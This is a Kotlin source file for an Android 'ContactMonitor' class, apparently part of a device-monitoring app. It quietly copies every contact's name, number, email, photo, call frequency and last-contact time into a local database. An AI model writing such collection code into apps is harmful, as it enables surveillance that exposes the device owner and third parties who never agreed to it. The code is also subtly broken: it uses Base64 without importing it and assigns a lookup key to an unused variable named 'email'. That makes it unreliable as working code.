package com.empresa.monitor.service.system

import android.Manifest
import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.provider.ContactsContract
import androidx.core.content.ContextCompat
import com.empresa.monitor.data.db.MonitorDatabase
import com.empresa.monitor.data.db.entity.ContactEntity
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream
import java.io.InputStream

class ContactMonitor(private val context: Context) {

    private val db = MonitorDatabase.getInstance(context)
    private val contactDao = db.contactDao()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isRunning = false

    fun startMonitoring() {
        if (isRunning) return
        isRunning = true

        if (!hasContactPermission()) return

        scope.launch {
            captureAllContacts()
        }
    }

    fun stopMonitoring() {
        isRunning = false
        scope.cancel()
    }

    private fun hasContactPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) ==
                PackageManager.PERMISSION_GRANTED
    }

    @SuppressLint("Range")
    private suspend fun captureAllContacts() {
        withContext(Dispatchers.IO) {
            try {
                val cursor = context.contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null,
                    null,
                    null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                )

                cursor?.use {
                    val contactMap = mutableMapOf<String, ContactEntity>()
                    while (it.moveToNext()) {
                        val name = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                        val phoneNumber = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                            ?.replace(" ", "")?.replace("-", "") ?: continue
                        val phoneType = it.getInt(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE))
                        val contactId = it.getLong(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID))
                        val timesContacted = it.getInt(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED))
                        val lastTimeContacted = it.getLong(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED))
                        val starred = it.getInt(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.STARRED)) == 1
                        val email = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LOOKUP_KEY))

                        // Get photo
                        val photoBase64 = getContactPhoto(contactId)

                        if (!contactMap.containsKey(phoneNumber)) {
                            contactMap[phoneNumber] = ContactEntity(
                                name = name,
                                phone = phoneNumber,
                                phoneType = phoneType,
                                email = getEmailForContact(contactId),
                                photoBase64 = photoBase64,
                                timesContacted = timesContacted,
                                lastTimeContacted = if (lastTimeContacted > 0) lastTimeContacted else null,
                                starred = starred
                            )
                        }
                    }
                    contactDao.insertAll(contactMap.values.toList())
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    @SuppressLint("Range")
    private fun getEmailForContact(contactId: Long): String? {
        try {
            val emailCursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Email.ADDRESS),
                "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
                arrayOf(contactId.toString()),
                null
            )
            emailCursor?.use {
                if (it.moveToFirst()) {
                    return it.getString(0)
                }
            }
        } catch (e: Exception) { /* ignore */ }
        return null
    }

    private fun getContactPhoto(contactId: Long): String? {
        return try {
            val uri = Uri.withAppendedPath(
                ContactsContract.Contacts.CONTENT_URI,
                contactId.toString()
            )
            val inputStream = ContactsContract.Contacts.openContactPhotoInputStream(
                context.contentResolver, uri, true
            )
            inputStream?.use { stream ->
                val bitmap = BitmapFactory.decodeStream(stream)
                if (bitmap != null) {
                    val baos = ByteArrayOutputStream()
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos)
                    val imageBytes = baos.toByteArray()
                    Base64.getEncoder().encodeToString(imageBytes)
                } else null
            }
        } catch (e: Exception) { null }
    }

    fun destroy() {
        stopMonitoring()
    }
}
